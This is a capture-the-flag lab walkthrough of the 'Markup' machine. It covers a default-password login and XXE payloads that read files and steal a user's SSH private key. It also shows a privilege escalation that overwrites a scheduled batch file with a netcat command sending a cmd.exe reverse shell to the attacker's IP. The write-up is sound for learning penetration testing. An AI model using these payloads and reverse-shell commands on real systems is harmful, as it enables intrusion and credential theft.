# Markup Writeup | April 7, 2026 | ZeroTrustWraith

## Enumeration
-----------------------------------------------------------------------------------------------------------
### 1. Scanning with Nmap

```sudo nmap -sC -A -Pn <target_IP>```

There's a webserver running on port 80

### 2. Opening the Webserver

http://<target_IP>:80

### 3. Testing Common Passwords

Test some of the common passwords. My examples are formatted as ```user:password```

```admin:admin```
```admin:administrator```
```admin:password```
```administrator:password```

We are able to login successfully with ```admin:password```

### 4. Exploring the Webpage

After trying to check out some of the sections of the page, we find the order page works and we can submit requests into it.

### 5. Information Gathering with BurpSuite

Within the proxy tab of BurpSuite, open the browser. Head to the webpage at ```http://<target_IP>:80```

Turn your interceptor ON in the proxy tab and then submit some generic information in the fields provided on the order page. For example, the number ```1``` in the "Quantity" field and a dummy address in the "Address" field (i.e., ```1337 Hacker Street Silicon Valley, CA 94027```)

Once the POST request pops up, right click it and send it to your repeater. After you send it to the repeater, turn the interceptor OFF.

Head to your repeater tab and examine the source code. We notice that this page is using XML 1.0. We can open a new web browser from our desktop and do a quick search for XML 1.0 vulnerabilities. Hacktricks has some good information on this. 

It looks like there's some good information for exploiting XML 1.0 on Hacktricks. However, we are going to need to gather some more information first.

### 6. Viewing the Webpage Source Code

Pull your desktop browser back up and head to the target webpage at ```http://<target_IP>:80```

If you don't have the webpage opened still, log back in with admin:password and go to the "orders" page again. From there, right click an empty field on the orders page and click "view page source."

Upon inspection, we can see the mention of a user named "Daniel." We can now try to use this information to gain a foothold in the target system.

## Foothold
-----------------------------------------------------------------------------------------------------------

### 1. Back to Hacktricks

Under the "main attacks" we  see a payload: 

```<!DOCTYPE foo [<!ENTITY toreplace "3"> ]>```

We can try to use this to gain some leverage. 

### 2. Back to BurpSuite

Head back to BurpSuite so we can place the payload.

Place your cursor immediately after the closing bracket on the line: ```<?xml version="1.0"?>```

Press enter and paste the payload.

Now, we need to figure out how to exploit the payload.

### 3. Testing Payloads

Change your payload in repeater tab of BurpSuite to this:

```<!DOCTYPE root [<!ENTITY test SYSTEM "file:///c:/windows/system.ini"> ]>```

Under the htlm code where it says ```<item>```, type in ```&test;```. If there is any other text between the two lines that say ```<item>```, delete it. We only want it to say ```&test;``` in that field. Make sure it's properly indented to match the HTML syntax. 

Now hit "send" on your repeater to test the payload. 

We can see a response to the right of the HTML source code on the repeater tab. There should be several lines of black text between lines 12 and 25. If you see any pink/purple HTML script similar to the HTML script in your repeater on the left-hand side, double check your syntax and make sure you didn't make any typos.

###. 4. Updating the payload

Now that we know our payload works, we need to update it to look for valuable information on the system.

There was an SSH port open when we ran Nmap. However, we will need a private key pair in order to connect to SSH successfully. If you open your browser and search "what is the SSH default key name," it will come back with the info that it's ```id_rsa```

Update your payload to this:

```<!DOCTYPE root [<!ENTITY test SYSTEM "file:///c:/users/daniel/.ssh/id_rsa"> ]>```

The response on the right-hand side gives us a private key. Copy the entire private key, including the dashes and sections that say "BEGIN OPENSSH PRIVATE KEY" and "END OPENSSH PRIVATE KEY."

### 5. Setting Up the SSH Private Key

Open your terminal and type in ```vim id_rsa```

Paste the private key and then type ```:wq!``` to save the file

Now change the id_rsa file permissions or the target won't accept the SSH Private Key.

Type ```sudo chmod 400 id_rsa```

### 6. Connecting to SSH

From your terminal, type ```ssh -i id_rsa daniel@<target_IP>

## Privilege Escalation
-----------------------------------------------------------------------------------------------------------
### 1. Enumerating the Target System

Type ```cd Desktop``` to head to the desktop.

Type ```dir``` to view the files listed on the desktop. 

There is a user.txt file. We can grab that by typing ```type user.txt```. This is our user flag.

Type ```whoami /priv``` to view daniel's user privileges.

Daniel has basic user privileges. We need to find a way to exploit this system to gain administrator privileges.

Navigate to the C:\ drive by typing ```cd C:\```.

There's some directories here. The one that looks the most interesting is "Log-Management." Navigate to the Log-Management directory by typing ```cd Log-Management```.

View the log management files/directories by typing ```dir```.

There is a file in this folder called "job.bat." We need to see what this file is and if it's possible to exploit it. Type ```type job.bat```. We can see that the file is executing wevtutil.exe and that it needs to run as an administrator. 

If we use the command ```icacls job.bat```, we can see who can run the file. It says that users can run the file but previously, it told us only administrators can run it. However, maybe we can overwrite the file with basic user permissions.

To see if this is worth exploring, let's check to see if this file is scheduled to run automatically.

Type ```powershell``` and then type ```ps``` in the powershell command line interface. We can see that wevtutils is scheduled to run automatically. If we can overwrite this file, we may be able to execute a script that gives us a reverse shell with administrator privileges. Exit the powershell command line interface using ```exit```.

### 2. Grabbing nc64-32.exe

nc64-32.exe is a reverse shell listening for 32 bit systems. We are going to try and overwite the job.bat file with the nc64-32 payload.

To get the nc64-32 file, type ```wget https://github.com/vinsworldcom/NetCat64/releases/download/nc32.exe```. 

### 3. Starting a Python Webserver

Open a new terminal and type ```sudo python3 -m http.server``` and press enter. You need to do this in the same folder as the nc64-32.exe file.

### 4. Uploading the nc64-32.exe File

From the command line interface on the target machine, download the nc64-32.exe file to the machine. Go to powershell again by typing ```powershell``` and then type in the following command:
```wget http://<your_tun0_IP>:8000/nc64-32.exe -outfile nc64-32.exe```. When you are finished, exit the powershell interface with ```exit```.

### 5. Updating the job.bat File Permissions

To make sure we can overwite the job.bat file, we need to try and change it's permissions.

Type ```attrib -r -h -s C:\Log-Management\job.bat```.

### 6. Starting a NetCat Listener

Open a new terminal and start a NetCat listening with the following command so that you can intercept the NetCat connection and start a reverse shell:

```nc -lvnp 1337```

This will start a NetCat listener on port 1337.

### 7. Overwriting the job.bat File with the nc64-32.exe NetCat Listener Script

We need to overwrite the job.bat file. Type the following command (use the same port as your NetCat):

```echo C:\Log-Management\nc64-32.exe -e cmd.exe <your_tun0_IP> <port> > C:\Log-Management\job.bat```

### 8. Escalated Privileges

The job.bat file should execute. If it doesn't execute immediately, it might take a couple of minutes. Once it executes, you will see your NetCat listener start a reverse shell in the target system.

### 9. Grabbing the Flag

You can use ```cd C:\Users\Administrator\Desktop``` to find the flag. Type ```dir``` to list the files on the desktop. The file is root.txt. Use ```type root.txt``` to output the flag in the file.





